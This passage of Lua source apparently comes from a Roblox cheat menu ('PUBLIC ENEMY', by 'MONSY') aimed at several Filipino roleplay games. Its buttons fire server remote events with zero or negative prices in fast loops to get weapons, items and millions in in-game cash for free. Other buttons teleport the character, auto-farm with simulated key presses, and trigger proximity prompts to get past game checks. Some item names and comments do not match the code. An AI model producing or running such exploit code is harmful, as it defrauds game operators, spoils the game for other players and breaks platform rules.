local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = oxyButton

--// Button click function
oxyButton.MouseButton1Click:Connect(function()
    oxyRemote:FireServer("APOY", -1)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BUHAY BARANGAY RP (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 250)  -- Adjusted height to fit content better
frame.Position = UDim2.new(0.5, -150, 0.5, -125)  -- Repositioned to center
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "BUHAY BARANGAY RP"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy (Silenced Pistol, Water, Oxy)
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Water", "Water"},
    {"Oxy", "Oxy"}
}

local selectedItem = nil

-- Create Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #items * 30)  -- Adjust the height based on item count
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Create buttons inside the dropdown
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]  -- Store the selected item's internal name
        dropdown.Text = item[1]  -- Update dropdown text to selected item
        dropdownFrame.Visible = false  -- Hide the dropdown after selection
    end)
end

-- Toggle Dropdown Visibility
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Toggle Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 85 + (#items * 30) + 5)  -- Adjusted position for Auto Buy button
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            if selectedItem == "Silenced Pistol" then
                game:GetService("ReplicatedStorage").GiveToolRemote:FireServer("Silenced Pistol", -0)
                print("Auto-buying Silenced Pistol")
            elseif selectedItem == "Desert Eagle" then
                game:GetService("ReplicatedStorage").GiveToolRemote:FireServer("Water", -0)
                print("Auto-buying Desert Eagle")
            elseif selectedItem == "AmmoBox" then
                game:GetService("ReplicatedStorage").GiveToolRemote:FireServer("Oxy", -0)
                print("Auto-buying AmmoBox")
            end
        end
        task.wait(10)  -- Wait 1 second between purchases to prevent spam
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)


addMainMenuButton("KALYEONSE SPAWN GUN (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 250)  -- Adjusted height to fit content better
frame.Position = UDim2.new(0.5, -150, 0.5, -125)  -- Repositioned to center
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "KALYE ONSE"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy (Silenced Pistol, Desert Eagle, AmmoBox)
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Desert Eagle", "Desert Eagle"},
    {"AmmoBox", "AmmoBox"}
}

local selectedItem = nil

-- Create Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #items * 30)  -- Adjust the height based on item count
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Create buttons inside the dropdown
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]  -- Store the selected item's internal name
        dropdown.Text = item[1]  -- Update dropdown text to selected item
        dropdownFrame.Visible = false  -- Hide the dropdown after selection
    end)
end

-- Toggle Dropdown Visibility
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Toggle Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 85 + (#items * 30) + 5)  -- Adjusted position for Auto Buy button
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            if selectedItem == "Silenced Pistol" then
                game:GetService("ReplicatedStorage").MicSystem:FireServer("Silenced Pistol", -0)
                print("Auto-buying Silenced Pistol")
            elseif selectedItem == "Desert Eagle" then
                game:GetService("ReplicatedStorage").MicSystem:FireServer("Desert Eagle", -0)
                print("Auto-buying Desert Eagle")
            elseif selectedItem == "AmmoBox" then
                game:GetService("ReplicatedStorage").MicSystem:FireServer("AmmoBox", -0)
                print("Auto-buying AmmoBox")
            end
        end
        task.wait(0.001)  -- Wait 1 second between purchases to prevent spam
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)


--// 4 Buttons in Roleplay Script
addMainMenuButton("DOMINION REFRESH CLICK 2 TIMES TO REFRESH (MONSY)", function()
-- LocalScript (Client)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")
local TweenService = game:GetService("TweenService")

-- IMAGE (PALITAN MO YUNG ASSET ID DITO)
local imageId = "rbxassetid://109075831425162" -- Your Image

-- GUI CREATION (FULL SCREEN IMAGE 4 SECONDS)
local playerGui = player:WaitForChild("PlayerGui")
local screen = Instance.new("ScreenGui")
screen.ResetOnSpawn = false
screen.IgnoreGuiInset = true -- IMPORTANT (removes ROBLOX top icon bar gap)
screen.Parent = playerGui

local image = Instance.new("ImageLabel")
image.Parent = screen
image.Size = UDim2.new(1, 0, 1, 0) -- Full screen EXACTLY
image.Position = UDim2.new(0, 0, 0, 0)
image.BackgroundColor3 = Color3.new(0,0,0)
image.BackgroundTransparency = 0
image.Image = imageId
image.ImageTransparency = 0

-- Hide after 4 seconds
task.spawn(function()
    task.wait(4.5)
    screen:Destroy()
end)

-- TARGET POSITION
local targetPosition = Vector3.new(-2005.1800537109375, 92.90731811523438, -1774.9578857421875)

-- TELEPORT (SUPER FAST MOVE)
local tweenInfo = TweenInfo.new(
    0.001, -- MAX FAST
    Enum.EasingStyle.Linear,
    Enum.EasingDirection.Out
)

local tween = TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(targetPosition)})
tween:Play()
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("AUTO FARM DOMINION BRICK (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Vim = game:GetService("VirtualInputManager")

--// Variables
local autoFarm = false

--// Function para mag-hold ng E
local function holdE(seconds)
    Vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(seconds)
    Vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

--// Function para kunin ang pinakamalapit na brick
local function getNearestBrick()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end

    local root = char.HumanoidRootPart
    local nearest, shortestDist = nil, math.huge

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name == "Brick" and obj:IsA("BasePart") then
            local dist = (obj.Position - root.Position).Magnitude
            if dist < shortestDist then
                shortestDist = dist
                nearest = obj
            end
        end
    end

    return nearest
end

--// Auto Farm Loop
task.spawn(function()
    while task.wait(0.1) do
        if autoFarm then
            local brick = getNearestBrick()
            if brick then
                -- Teleport sa ibabaw ng brick
                LocalPlayer.Character:PivotTo(brick.CFrame + Vector3.new(0, 3, 0))
                task.wait(0.1)
                holdE(2) -- hold E
                task.wait(2) -- cooldown bago ulit
            end
        end
    end
end)

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 250, 0, 100)
Frame.Position = UDim2.new(0.5, -125, 0.5, -50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title.BorderSizePixel = 0
Title.Text = "PUBLIC ENEMY AUTO FARM"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 18
Title.Parent = Frame

local Button = Instance.new("TextButton")
Button.Size = UDim2.new(1, -20, 0, 40)
Button.Position = UDim2.new(0, 10, 0, 40)
Button.BackgroundColor3 = Color3.fromRGB(255,255,255)
Button.BorderSizePixel = 0
Button.Text = "Auto Farm: OFF"
Button.TextColor3 = Color3.fromRGB(0,0,0)
Button.Font = Enum.Font.Roboto
Button.TextSize = 18
Button.Parent = Frame

--// Button Toggle
Button.MouseButton1Click:Connect(function()
    autoFarm = not autoFarm
    Button.Text = "Auto Farm: " .. (autoFarm and "ON" or "OFF")
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PINOY DARK RP (MONSY)", function()
	-- Auto Farm Garbage: instant TP + auto E + Auto Sell All (by button)
-- PUBLIC ENEMY BYPASS CS

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LP = Players.LocalPlayer

local GarbageEvent = ReplicatedStorage:FindFirstChild("GarbageRewardEvent")
local AUTO_FARM = false
local HOVER_HEIGHT = 3
local LOOT_COOLDOWN = 0.05

--================ GUI ==================
local ScreenGui = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- pure black
Frame.Size = UDim2.new(0, 200, 0, 90)
Frame.Position = UDim2.new(0.4, 0, 0.1, 0)
Frame.Active = true
Frame.Draggable = true

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0.3, 0)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title.Text = "PUBLIC ENEMY AUTO FARM "
Title.TextColor3 = Color3.new(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 16

local AutoFarmBtn = Instance.new("TextButton", Frame)
AutoFarmBtn.Size = UDim2.new(1, 0, 0.35, 0)
AutoFarmBtn.Position = UDim2.new(0, 0, 0.3, 0)
AutoFarmBtn.Text = "Auto Farm: OFF"
AutoFarmBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
AutoFarmBtn.TextColor3 = Color3.new(0,0,0)
AutoFarmBtn.Font = Enum.Font.Roboto
AutoFarmBtn.TextSize = 18

local AutoSellBtn = Instance.new("TextButton", Frame)
AutoSellBtn.Size = UDim2.new(1, 0, 0.35, 0)
AutoSellBtn.Position = UDim2.new(0, 0, 0.65, 0)
AutoSellBtn.Text = "Auto Sell Now"
AutoSellBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
AutoSellBtn.TextColor3 = Color3.new(0,0,0)
AutoSellBtn.Font = Enum.Font.Roboto
AutoSellBtn.TextSize = 18

AutoFarmBtn.MouseButton1Click:Connect(function()
    AUTO_FARM = not AUTO_FARM
    AutoFarmBtn.Text = "Auto Farm: " .. (AUTO_FARM and "ON" or "OFF")
end)
--======================================

local function getHRP()
    local char = LP.Character or LP.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart")
end

local function tpInstant(pos)
    local hrp = getHRP()
    hrp.CFrame = CFrame.new(pos + Vector3.new(0, HOVER_HEIGHT, 0))
    task.wait(0.05)
end

local function triggerPrompt(prompt)
    if fireproximityprompt then
        fireproximityprompt(prompt)
    else
        local old = prompt.HoldDuration
        prompt.HoldDuration = 0
        prompt:InputHoldBegin(); task.wait()
        prompt:InputHoldEnd()
        prompt.HoldDuration = old
    end
end

local function findAllGarbage()
    local list = {}
    for _, d in ipairs(workspace:GetDescendants()) do
        if d:IsA("ProximityPrompt") then
            local ot = (d.ObjectText or ""):lower()
            local at = (d.ActionText or ""):lower()
            local pn = d.Parent and d.Parent.Name:lower() or ""
            if ot:find("garbage") or at:find("garbage") or pn:find("garbage") then
                table.insert(list, d)
            end
        end
    end
    local hrp = getHRP()
    table.sort(list, function(a,b)
        local pa = (a.Parent:IsA("BasePart") and a.Parent or a.Parent:FindFirstChildWhichIsA("BasePart", true))
        local pb = (b.Parent:IsA("BasePart") and b.Parent or b.Parent:FindFirstChildWhichIsA("BasePart", true))
        pa = pa and pa.Position or hrp.Position
        pb = pb and pb.Position or hrp.Position
        return (hrp.Position - pa).Magnitude < (hrp.Position - pb).Magnitude
    end)
    return list
end

local function findSellPrompt()
    for _, d in ipairs(workspace:GetDescendants()) do
        if d:IsA("ProximityPrompt") then
            local ot = (d.ObjectText or ""):lower()
            local at = (d.ActionText or ""):lower()
            local nm = (d.Name or ""):lower()
            if (ot..at..nm):find("sell") and (ot..at..nm):find("garbage") then
                return d
            end
        end
    end
end

local function getGarbageTools()
    local t = {}
    local function scan(container)
        for _, v in ipairs(container:GetChildren()) do
            if v:IsA("Tool") and v.Name:lower():find("garbage") then
                table.insert(t, v)
            end
        end
    end
    scan(LP.Backpack)
    if LP.Character then scan(LP.Character) end
    return t
end

local function countGarbageTools()
    return #getGarbageTools()
end

local function collect(prompt)
    local part = prompt.Parent:IsA("BasePart") and prompt.Parent or prompt.Parent:FindFirstChildWhichIsA("BasePart", true)
    if not part then return end
    tpInstant(part.Position)
    triggerPrompt(prompt)
    if GarbageEvent then pcall(function() GarbageEvent:FireServer() end) end
    task.wait(LOOT_COOLDOWN)
end

local function sellAllNow()
    local sellPrompt = findSellPrompt()
    if not sellPrompt then return end
    local part = sellPrompt.Parent:IsA("BasePart") and sellPrompt.Parent or sellPrompt.Parent:FindFirstChildWhichIsA("BasePart", true)
    if not part then return end

    tpInstant(part.Position)
    task.wait(0.2)

    local safety = 0
    while countGarbageTools() > 0 and safety < 200 do
        safety += 1
        local any = getGarbageTools()[1]
        if any then
            if any.Parent ~= LP.Character then
                any.Parent = LP.Character
                task.wait(0.08)
            end
            triggerPrompt(sellPrompt)
            task.wait(0.12)
        else
            break
        end
    end
end

AutoSellBtn.MouseButton1Click:Connect(sellAllNow)

task.spawn(function()
    while task.wait(0.05) do
        if AUTO_FARM then
            local targets = findAllGarbage()
            if #targets > 0 then
                for _, p in ipairs(targets) do
                    if not AUTO_FARM then break end
                    collect(p)
                end
            else
                if countGarbageTools() > 0 then
                    sellAllNow()
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GIVE ALL CASH 10M (MONSY)", function()
	local Players = game:GetService("Players")

local function giveMoneyToAll(amount)
	for _, player in ipairs(Players:GetPlayers()) do
		local stats = player:FindFirstChild("leaderstats")
		if stats then
			local cash = stats:FindFirstChild("Cash")
			if cash then
				cash.Value += amount
			end
		end
	end
end

-- Example: Bigyan lahat ng +10,000,000
giveMoneyToAll(10000000)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BUY GUNSHOP LIST (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY ALL CITY CMD"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Glock-17", "Desert Deagle", "AmmoBox", "Skorpion", "HK416", "UZI"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.GunShop.Events.Purchase:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CAVITE ROLEPLAY (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CAVITE RP"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"SP", "Oxy"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
